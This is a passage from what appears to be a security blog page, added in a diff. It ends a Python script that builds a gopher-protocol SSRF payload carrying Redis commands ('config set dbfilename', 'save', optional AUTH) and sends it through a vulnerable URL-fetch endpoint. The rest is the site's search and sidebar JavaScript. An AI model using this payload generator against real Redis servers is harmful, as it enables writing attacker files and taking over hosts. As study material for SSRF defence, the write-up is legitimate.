+&quot;config set dbfilename {
+}
+&quot;.format(filename),
+&quot;save&quot;,
+&quot;quit&quot;
+]
+if passwd:
+cmd.insert(0,&quot;AUTH {
+}
+&quot;.format(passwd))payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;
+def redis_format(arr):
+CRLF = &quot;\r\n&quot;
+redis_arr = arr.split(&quot; &quot;)
+cmd = &quot;&quot;
+cmd += &quot;*&quot; + str(len(redis_arr))
+for x in redis_arr:
+cmd += CRLF + &quot;{{content}}quot; + str(len((x.replace(&quot;${
+IFS}
+&quot;,&quot; &quot;)))) + CRLF + x.replace(&quot;${
+IFS}
+&quot;,&quot; &quot;)
+cmd += CRLF
+return cmd
+if __name__==&quot;__main__&quot;:
+for x in cmd:
+payload += urllib.parse.quote(redis_format(x))
+# 最后一个url 编码是因为get传递参数 这个是可选的需要看前端的写法
+#
+print(payload)
+#
+print(urllib.parse.quote(payload))
+import requests
+res=requests.get(&quot;http://192.168.53.128/visit?url=&quot;+urllib.parse.quote(payload)).text
+print(res)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106214402.png" alt="image.png"></p>
+
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Search Logic
+        const searchInput = document.getElementById('searchInput');
+        const searchResults = document.getElementById('searchResults');
+        
+        // Focus shortcut
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                e.preventDefault();
+                searchInput.focus();
+            }
+        });
+
+        let searchIndex = [];
+
+        // Load Index
+        fetch('/search.json')
+            .then(res => res.json())
+            .then(data => {
+                searchIndex = data;
+            });
+
+        searchInput.addEventListener('input', (e) => {
+            const query = e.target.value.toLowerCase();
+            if (query.length < 2) {
+                searchResults.style.display = 'none';
+                return;
+            }
+
+            const results = searchIndex.filter(item => 
+                item.title.toLowerCase().includes(query) || 
+                (item.content && item.content.toLowerCase().includes(query))
+            ).slice(0, 8); // Limit to 8
+
+            if (results.length > 0) {
+                searchResults.innerHTML = results.map(item => `
+                    <a href="${item.link}" class="search-result-item">
+                        <div class="search-result-title">📄 ${item.title}</div>
+                        <div class="search-result-meta">${item.date} · ${item.category}</div>
+                    </a>
+                `).join('');
+                searchResults.style.display = 'block';
+            } else {
+                searchResults.innerHTML = '<div style="padding:1rem;color:#9ca3af;text-align:center;">无搜索结果</div>';
+                searchResults.style.display = 'block';
+            }
+        });
+
+        // Close search on outside click
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.search-container')) {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Sidebar Logic Enhanced
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentPath = window.location.pathname;
+            
+            // 1. Highlight Active Link & Open Parent
+            const navLinks = document.querySelectorAll('.nav-item');
+            navLinks.forEach(link => {
+                let href = link.getAttribute('href');
+                // Normalize paths for comparison (remove trailing slashes, ignoring domain)
+                if (href && currentPath.indexOf(href) !== -1 && href !== '/') {
+                    link.classList.add('active');
+                    
+                    // Open all parents
+                    let parent = link.closest('details');
+                    while (parent) {
+                        parent.open = true;
+                        parent = parent.parentElement.closest('details');
+                    }
+                }
+            });
+
+            // 2. Preserve Sidebar Scroll Position
+            const sidebar = document.querySelector('.nav-group');
+            if (sidebar) {
+                const storedScroll = localStorage.getItem('sidebarScroll');
+                if (storedScroll) {
+                    sidebar.scrollTop = storedScroll;
+                }
+                
+                // Save scroll on click or before unload
+                window.addEventListener('beforeunload', () => {
+                    localStorage.setItem('sidebarScroll', sidebar.scrollTop);
+                });
+            }
+
+            // 3. User Experience: Keep manually opened folders open? 
+            // Optional: for now, the "Active Link" logic is usually enough for navigation.
+            // If user wants manual persistence, we need IDs for every details element.
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+</body>
+</html>
